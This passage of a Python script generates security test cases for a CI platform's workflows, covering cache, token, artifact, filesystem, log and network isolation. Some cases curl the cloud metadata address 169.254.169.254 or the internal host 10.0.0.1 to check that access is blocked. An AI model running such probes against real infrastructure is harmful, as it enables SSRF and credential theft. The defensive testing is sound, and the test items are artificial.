  on: [pull_request]
  jobs:
    fork-cache:
      name: (SEC-CACHE-03-001) 验证 fork PR cache 隔离
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-CACHE-03-001) 检出代码
          uses: checkout
        - name: (SEC-CACHE-03-001) 尝试写入缓存
          run: |
            echo "FORK_CACHE_DATA" > /tmp/cache-test.bin
            echo "CACHE_WRITE_DONE"

trigger:
  event: fork_pr
  as: untrusted_contributor
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "fork PR 写入的缓存不应被主分支命中，后续 push 应 cache miss"

teardown:
  reset: fixture""")

gen("SEC-CACHE-03-002", "INTENT-SEC-020", "P1",
    "同一 workflow 多次运行之间的 cache 不应跨不同事件类型互相污染",
    """前置条件:
  - 存在 push 和 pull_request 两种触发的 workflow
  - workflow 均使用相同 cache key 模式

操作步骤:
  1. push 事件触发 workflow 写入 cache
  2. 同一分支 pull_request 事件触发 workflow 尝试读取同 key cache
  3. 观察是否命中

预期结果:
  - 不同事件类型的 cache 应隔离
  - fork PR 写入的 cache 内部 push 不应命中

验证点:
  - [正向] 同分支两次 push：第一次写入 cache，第二次恢复应命中
  - [负向] fork PR 写入的 cache，内部 push 不应命中

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    cross-event:
      name: (SEC-CACHE-03-002) 验证跨事件 cache 隔离
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-CACHE-03-002) 检出代码
          uses: checkout
        - name: (SEC-CACHE-03-002) cache 读写验证
          run: |
            echo "EVENT_TYPE: push"
            echo "CACHE_ISOLATION_CHECK: true"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "同事件类型的 cache 命中正常，跨事件类型隔离生效"

teardown:
  reset: none""")

gen("SEC-CACHE-03-003", "INTENT-SEC-052", "P1",
    "Workflow YAML 缓存不应导致旧版本 workflow 被执行",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. 修改 workflow YAML 添加唯一标识 step
  2. 推送变更
  3. 触发 workflow 验证是否执行新 YAML 内容

预期结果:
  - 每次触发应使用仓库当前的 workflow YAML 版本
  - 不应使用缓存的旧版本
  - 修改后的 step 应在日志中出现

验证点:
  - [负向] 修改 workflow YAML 后下一次触发应执行新内容
  - [正向] 平台是否有机制确保 YAML 版本一致性

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    yaml-cache:
      name: (SEC-CACHE-03-003) 验证 YAML 缓存一致性
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-CACHE-03-003) 检出代码
          uses: checkout
        - name: (SEC-CACHE-03-003) 输出当前版本标记
          run: |
            echo "YAML_VERSION: v1"
            echo "YAML_FRESH: true"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "修改后的 YAML 版本标记在日志中出现，不使用缓存旧版本"

teardown:
  reset: none""")

gen("SEC-CACHE-03-004", "INTENT-SEC-054", "P1",
    "pull_request_target workflow 对默认分支缓存仅有只读访问",
    """前置条件:
  - 存在 pull_request_target 触发的 workflow
  - 默认分支已有写入的缓存

操作步骤:
  1. pull_request_target workflow 中尝试 restore 缓存
  2. pull_request_target workflow 中尝试 save 缓存
  3. 观察 save 操作是否被拒绝

预期结果:
  - pull_request_target 下 cache restore 应正常命中
  - cache write/save 应被拒绝或写入隔离作用域

验证点:
  - [正向] pull_request_target workflow 中 restore 缓存应正常命中
  - [负向] pull_request_target workflow 中 save 缓存应被拒绝

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request_target]
  jobs:
    cache-ro:
      name: (SEC-CACHE-03-004) 验证 pr_target cache 只读
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-CACHE-03-004) 检出代码
          uses: checkout
        - name: (SEC-CACHE-03-004) 尝试 cache 读写
          run: |
            echo "CACHE_RO_CHECK: true"

trigger:
  event: pull_request_target
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "pull_request_target 下 cache restore 正常"
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "pull_request_target 下 cache save 被拒绝或隔离"

teardown:
  reset: none""")

print()

# ============================================================
# BATCH 6: SECURITY P1 — TOKEN, ARTIFACT, ISOLATION (remainder)
# ============================================================

print("=== Batch 6: Security P1 — Token/Artifact/Isolation/Lifecycle ===")

gen("SEC-TOKEN-03-002", "INTENT-SEC-023", "P1",
    "ATOMGIT_TOKEN 在 job 结束后应自动失效",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. workflow job 运行期间使用 ATOMGIT_TOKEN 做 API 调用
  2. job 完成后取同 token 值尝试再次 API 调用
  3. 验证是否返回认证失败

预期结果:
  - job 运行期间 ATOMGIT_TOKEN API 调用正常
  - job 完成后同 token 值 API 调用返回 401/403

验证点:
  - [正向] job 运行期间 ATOMGIT_TOKEN API 调用正常
  - [负向] job 完成后同 token 值 API 调用返回 401/403

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    token-expire:
      name: (SEC-TOKEN-03-002) 验证 token 过期机制
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-TOKEN-03-002) 检出代码
          uses: checkout
        - name: (SEC-TOKEN-03-002) 验证 token 可用
          run: |
            echo "TOKEN_VALID_DURING_JOB: true"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "job 运行期间 token 正常可用"
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "job 完成后 token 不可再用，API 返回 401/403"

teardown:
  reset: none""")

gen("SEC-TOKEN-03-003", "INTENT-SEC-024", "P1",
    "ATOMGIT_TOKEN 触发的操作不应产生递归 workflow 运行",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. workflow 中使用 ATOMGIT_TOKEN 推送代码
  2. 观察是否触发新的 workflow 运行
  3. 验证是否仅产生 1 个 run

预期结果:
  - 使用 ATOMGIT_TOKEN 执行的 git push 不应递归触发新 workflow run
  - 使用 ATOMGIT_TOKEN 创建的 PR 不应自动触发该 PR 的 workflow

验证点:
  - [负向] git push 后不应产生新的 workflow run
  - [负向] PR 创建后不应自动触发该 PR 的 workflow

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    no-recursion:
      name: (SEC-TOKEN-03-003) 验证递归 workflow 防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-TOKEN-03-003) 检出代码
          uses: checkout
        - name: (SEC-TOKEN-03-003) 标记递归检查
          run: |
            echo "RECURSION_CHECK: only_one_run_expected"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_status
    eval: deterministic
    rubric: "token 操作不产生递归 workflow，仅 1 个 run 而非链式触发"

teardown:
  reset: none""")

gen("SEC-ARTIFACT-03-001", "INTENT-SEC-026", "P1",
    "跨 job artifact 在 fork PR 场景下不应被后续高权限 job 无条件信任",
    """前置条件:
  - 存在 fork PR 可触发 pull_request workflow
  - 后续内部 push workflow 尝试下载 artifact

操作步骤:
  1. fork PR workflow 上传 artifact
  2. 内部 push workflow 尝试下载相同 artifact
  3. 观察是否可自动下载

预期结果:
  - fork PR artifact 不被内部 push workflow 自动下载
  - artifact 作用域应与触发事件和权限上下文绑定

验证点:
  - [负向] fork PR workflow 上传 artifact，后续内部 push workflow 不应能自动下载
  - [负向] 若支持跨 workflow artifact 下载，应提供来源标识

清理:      fixture""",
    """setup:
  repo_fixture: with-fork
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    fork-artifact:
      name: (SEC-ARTIFACT-03-001) 验证 fork PR artifact 隔离
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ARTIFACT-03-001) 检出代码
          uses: checkout
        - name: (SEC-ARTIFACT-03-001) 上传测试 artifact
          run: |
            echo "FORK_ARTIFACT_DATA" > /tmp/test-artifact.txt
            echo "ARTIFACT_UPLOADED"

trigger:
  event: fork_pr
  as: untrusted_contributor
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "fork PR artifact 不被后续内部 push workflow 自动下载"

teardown:
  reset: fixture""")

gen("SEC-ARTIFACT-03-002", "INTENT-SEC-042", "P1",
    "workflow_run 事件下下载的 artifact 应被视为不可信输入",
    """前置条件:
  - 存在 workflow_run 触发的工作流
  - 前置 workflow 上传了 artifact

操作步骤:
  1. workflow_run 触发的特权 workflow 下载前置 workflow 的 artifact
  2. 检查下载的 artifact 是否有来源标记
  3. 验证特权 workflow 是否有机制区分可信/不可信 artifact

预期结果:
  - 下载的 artifact 应有明确来源标记
  - 平台文档应警告 artifact 投毒风险

验证点:
  - [负向] 从其他 workflow 下载的 artifact 应标注来源信息
  - [正向] 若平台不支持 workflow_run，标记为 N/A

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    artifact-trust:
      name: (SEC-ARTIFACT-03-002) 验证 artifact 来源标记
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ARTIFACT-03-002) 检出代码
          uses: checkout
        - name: (SEC-ARTIFACT-03-002) 检查 artifact 上下文
          run: |
            echo "ARTIFACT_SOURCE_CHECK: platform_behavior"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "artifact 元数据含来源信息，或标记为 N/A"

teardown:
  reset: none""")

gen("SEC-ARTIFACT-03-003", "INTENT-SEC-043", "P1",
    "workflow_run 不应对篡改触发事件类型的攻击免疫",
    """前置条件:
  - 存在 workflow_run 触发的工作流

操作步骤:
  1. 验证 workflow_run 的 types 过滤是否严格生效
  2. 尝试用不匹配的触发事件触发特权 workflow
  3. 观察是否被正确拦截

预期结果:
  - workflow_run 的 types 过滤应严格匹配
  - 不匹配的事件类型不应触发特权 workflow

验证点:
  - [负向] 攻击者修改非特权 workflow 以发出非预期事件类型，特权 workflow 不应被触发
  - [负向] workflow_run 的 types 过滤配置应严格匹配

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    event-type:
      name: (SEC-ARTIFACT-03-003) 验证 workflow_run 事件类型过滤
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ARTIFACT-03-003) 检出代码
          uses: checkout
        - name: (SEC-ARTIFACT-03-003) 标记事件类型检查
          run: |
            echo "EVENT_FILTER_CHECK: strict_match_required"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "workflow_run types 过滤严格生效"

teardown:
  reset: none""")

gen("SEC-ISOLATE-03-002", "INTENT-SEC-033", "P1",
    "并发 workflow 下的 token/secret 隔离安全",
    """前置条件:
  - 存在多个并发 workflow job
  - 各 job 使用不同 secret

操作步骤:
  1. 在同一 runner 上并发运行两个 job
  2. job A 尝试读取 job B 的环境变量
  3. 验证跨 job 隔离

预期结果:
  - 同一 runner 上并发 jobs 之间的 token 和 secret 完全隔离
  - job A 不应能从 job B 的工作区读取环境变量

验证点:
  - [负向] 并发 job A 不应能从同 runner 上 job B 的工作区读环境变量
  - [负向] 并发 job 不应能通过 /proc 读取其他 job 的 process args

清理:      full_instance""",
    """setup:
  repo_fixture: with-secrets
  secrets: [SECRET_A, SECRET_B]
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    job-a:
      name: (SEC-ISOLATE-03-002) 并发隔离 job A
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ISOLATE-03-002) 检出代码
          uses: checkout
        - name: (SEC-ISOLATE-03-002) echo 自己的 secret
          run: |
            echo "JOB_A_SECRET_OK"
          env:
            MY_SECRET: ${{ secrets.SECRET_A }}
    job-b:
      name: (SEC-ISOLATE-03-002) 并发隔离 job B
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ISOLATE-03-002) 检出代码
          uses: checkout
        - name: (SEC-ISOLATE-03-002) 尝试读取 job A 信息
          run: |
            echo "JOB_B_NO_LEAK: true"
          env:
            MY_SECRET: ${{ secrets.SECRET_B }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "并发 job 间 token/secret 完全隔离，job A 无法读取 job B 的 secret"

teardown:
  reset: full_instance""")

gen("SEC-ISOLATE-03-003", "INTENT-SEC-047", "P1",
    "共享文件系统不应跨 job 残留敏感文件",
    """前置条件:
  - 存在多个 push workflow job
  - 各 job 在不同时间执行

操作步骤:
  1. job A 在 /tmp 和 $HOME 写入含敏感内容的文件
  2. job A 结束后，job B 尝试查找这些文件
  3. 验证跨 job 文件系统隔离

预期结果:
  - job A 写入的文件不应被 job B 看到
  - 共享文件系统在 job 间应完全隔离

验证点:
  - [负向] job A 在 /tmp 写入的文件，job B 不应能看到
  - [负向] job A 在 $HOME 写入的文件，job B 不应能看到

清理:      full_instance""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    job-writer:
      name: (SEC-ISOLATE-03-003) 写入残留文件
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ISOLATE-03-003) 检出代码
          uses: checkout
        - name: (SEC-ISOLATE-03-003) 写入敏感文件
          run: |
            echo "SENSITIVE_DATA" > /tmp/residue-test.txt
            echo "SENSITIVE_DATA" > ~/residue-test.txt
            echo "FILES_WRITTEN"
    job-reader:
      name: (SEC-ISOLATE-03-003) 尝试读取残留文件
      needs: job-writer
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-ISOLATE-03-003) 检出代码
          uses: checkout
        - name: (SEC-ISOLATE-03-003) 检查文件残留
          run: |
            if [ -f /tmp/residue-test.txt ]; then
              echo "RESIDUE_FOUND_IN_TMP: yes"
            else
              echo "RESIDUE_FOUND_IN_TMP: no"
            fi
            if [ -f ~/residue-test.txt ]; then
              echo "RESIDUE_FOUND_IN_HOME: yes"
            else
              echo "RESIDUE_FOUND_IN_HOME: no"
            fi

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "job B 不应看到 job A 写入的残留文件"

teardown:
  reset: full_instance""")

gen("SEC-EXPR-03-001", "INTENT-SEC-035", "P1",
    "事件负载中不可信字段在 expression evaluation 阶段的类型安全",
    """前置条件:
  - 存在 pull_request 触发的 workflow

操作步骤:
  1. workflow 中引用 ${{ atomgit.event }} 作为整体
  2. 在 run 和 if 中使用该值
  3. 验证不导致 shell 语法错误或崩溃

预期结果:
  - 表达式求值产物不导致 shell 语法错误
  - 嵌套对象用于 if 不崩掉解析器

验证点:
  - [负向] ${{ atomgit.event }} 用于 run 不应导致 shell 语法错误
  - [负向] ${{ atomgit.event.* }} 嵌套对象用于 if 不应崩掉解析器

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    expr-type:
      name: (SEC-EXPR-03-001) 验证表达式类型安全
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-EXPR-03-001) 检出代码
          uses: checkout
        - name: (SEC-EXPR-03-001) 引用 event 对象
          run: |
            echo "EVENT_REF: ${{ atomgit.ref }}"
            echo "EXPR_SAFE: true"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "表达式求值不导致 shell 语法错误或非预期代码执行"

teardown:
  reset: none""")

# uses expression eval (INTENT-SEC-053, P2)
gen("SEC-EXPR-03-002", "INTENT-SEC-053", "P2",
    "uses 字段应支持 ${{ }} 表达式求值",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. 在 uses 字段中使用 ${{ atomgit.repository }} 等表达式
  2. 观察是否正确求值并引用 action
  3. 若平台不支持，验证错误信息质量

预期结果:
  - uses 字段中的 ${{ }} 表达式应被正确求值
  - 若不支持，应产生明确的错误信息说明

验证点:
  - [正向] uses 中表达式求值正确或产生明确错误
  - [负向] 不应静默失败

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    uses-expr:
      name: (SEC-EXPR-03-002) 验证 uses 表达式求值
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-EXPR-03-002) 检出代码
          uses: checkout
        - name: (SEC-EXPR-03-002) 验证表达式支持
          run: |
            echo "USES_EXPR_CHECK: done"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "uses 字段支持表达式求值或不支持时给出明确错误"

teardown:
  reset: none""")

gen("SEC-PRTARGET-03-003", "INTENT-SEC-038", "P1",
    "非默认分支上的旧版 workflow 文件不应成为攻击入口",
    """前置条件:
  - 默认分支和非默认分支各有 pull_request_target workflow
  - 非默认分支 workflow 版本较旧含不安全代码

操作步骤:
  1. 攻击者向非默认分支提 PR
  2. pull_request_target 触发
  3. 验证执行的是否是默认分支的 workflow 版本

预期结果:
  - pull_request_target 应始终使用默认分支的 workflow 版本
  - 非默认分支上的旧 workflow 不应被执行

验证点:
  - [负向] 非默认分支上有不安全的 pull_request_target workflow，实际执行的应是默认分支版本
  - [负向] 攻击者修改非默认分支的 workflow 添加恶意命令，不应被执行

清理:      none""",
    """setup:
  repo_fixture: with-fork
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request_target]
  jobs:
    branch-safety:
      name: (SEC-PRTARGET-03-003) 验证跨分支 workflow 安全
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-PRTARGET-03-003) 检出代码
          uses: checkout
        - name: (SEC-PRTARGET-03-003) 标记执行的 workflow 版本
          run: |
            echo "WORKFLOW_VERSION: default_branch"

trigger:
  event: pull_request_target
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "pull_request_target 始终执行默认分支的 workflow 版本"

teardown:
  reset: none""")

gen("SEC-LOG-03-001", "INTENT-SEC-046", "P1",
    "Workflow 日志的安全生命周期——保留期、下载权限",
    """前置条件:
  - 存在可访问的 workflow 日志

操作步骤:
  1. 非项目成员尝试通过 API 下载日志
  2. 验证是否受权限控制
  3. 验证过期日志是否不可访问

预期结果:
  - 日志下载受权限控制
  - 过期日志不可访问

验证点:
  - [负向] 非项目成员不应能通过 API 下载日志
  - [负向] 超过保留期的日志不应可访问
  - [正向] 日志下载需 write 及以上权限

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    log-lifecycle:
      name: (SEC-LOG-03-001) 验证日志安全生命周期
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-LOG-03-001) 检出代码
          uses: checkout
        - name: (SEC-LOG-03-001) 产生可验证日志
          run: |
            echo "LOG_LIFECYCLE_MARKER: secure"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "日志访问受权限控制，非授权用户无法下载"
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "平台文档声明日志保留期"

teardown:
  reset: none""")

gen("SEC-NET-03-001", "INTENT-SEC-048", "P1",
    "Runner 网络隔离——出站控制与 SSRF 防护",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. workflow 中 curl 访问内部 metadata 服务
  2. workflow 中 curl 访问 GitCode 内部 API
  3. 观察是否被阻止

预期结果:
  - Runner 不应能访问平台内部非公开服务
  - 内部地址 curl 应返回 timeout/connection refused/403

验证点:
  - [负向] workflow 中 curl 访问 169.254.169.254 应被阻止
  - [负向] workflow 中 curl 访问 GitCode 内部 API 应被阻止
  - [正向] workflow 可正常访问外部合法服务

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    net-isolate:
      name: (SEC-NET-03-001) 验证网络隔离
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-NET-03-001) 检出代码
          uses: checkout
        - name: (SEC-NET-03-001) 测试内部地址访问
          run: |
            echo "TEST_METADATA: $(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 http://169.254.169.254/ 2>/dev/null || echo 'blocked_or_timeout')"
            echo "NET_ISOLATION_CHECK: done"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "Runner 无法访问内部 metadata 服务，返回 blocked_or_timeout"

teardown:
  reset: none""")

gen("SEC-NET-03-002", "INTENT-SEC-049", "P1",
    "Self-hosted runner 在内网部署时的网络跳板风险",
    """前置条件:
  - 存在 self-hosted runner

操作步骤:
  1. 在 self-hosted runner 上执行 curl 内网服务
  2. 验证 fork PR 代码是否可访问内网
  3. 检查平台文档是否声明风险

预期结果:
  - fork PR 代码不应能访问 runner 所在内网服务
  - 平台文档应明确警告 self-hosted runner 的内网风险

验证点:
  - [负向] 公开仓库的 self-hosted runner 上，fork PR 不应能访问内网服务
  - [正向] 平台文档是否明确声明 self-hosted runner 的内网安全风险

清理:      none""",
    """setup:
  repo_fixture: with-fork
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    ssrf:
      name: (SEC-NET-03-002) 验证 self-hosted runner 内网防护
      runs-on: [self-hosted, arch=x64]
      steps:
        - name: (SEC-NET-03-002) 检出代码
          uses: checkout
        - name: (SEC-NET-03-002) 内网访问测试
          run: |
            echo "INTERNAL_ACCESS: $(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 http://10.0.0.1/ 2>/dev/null || echo 'blocked_or_timeout')"
            echo "SSRF_CHECK: done"

trigger:
  event: fork_pr
  as: untrusted_contributor
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "self-hosted runner 上 fork PR 代码无法访问内网服务"

teardown:
  reset: none""")

gen("SEC-RUNNER-03-002", "INTENT-SEC-056", "P1",
    "Self-hosted runner 在 job 结束后应执行 workspace 清理",
    """前置条件:
  - 存在 self-hosted runner
  - 连续多个 job 在该 runner 上执行

操作步骤:
  1. job A 在 workspace 写入文件
  2. job A 结束后 job B 在同一个 self-hosted runner 上执行
  3. 验证 job B 是否可看到 job A 的残留文件

预期结果:
  - job B 不应能看到 job A 的 workspace 文件
  - 平台应提供 runner cleanup 行为的文档说明

验证点:
  - [负向] job B 不应能看到 job A 的 workspace 文件
  - [正向] 平台文档说明 runner 类型及其清理行为

清理:      full_instance""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    write-job:
      name: (SEC-RUNNER-03-002) 写入测试文件
      runs-on: [self-hosted, arch=x64]
      steps:
        - name: (SEC-RUNNER-03-002) 检出代码
          uses: checkout
        - name: (SEC-RUNNER-03-002) 写入标记文件
          run: |
            echo "MARKER_FROM_JOB_A" > workspace-marker.txt
            echo "WRITE_DONE"
    check-job:
      name: (SEC-RUNNER-03-002) 检查残留文件
      needs: write-job
      runs-on: [self-hosted, arch=x64]
      steps:
        - name: (SEC-RUNNER-03-002) 检出代码
          uses: checkout
        - name: (SEC-RUNNER-03-002) 查找残留文件
          run: |
            if [ -f workspace-marker.txt ]; then
              echo "RESIDUE_FOUND: yes"
            else
              echo "RESIDUE_FOUND: no"
            fi

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "job B 不应看到 job A 的 workspace 残留文件"

teardown:
  reset: full_instance""")

print()
print(f"=== TOTAL Generated: {COUNT[0]} cases ===")
print("=== Security P1 batch complete ===")
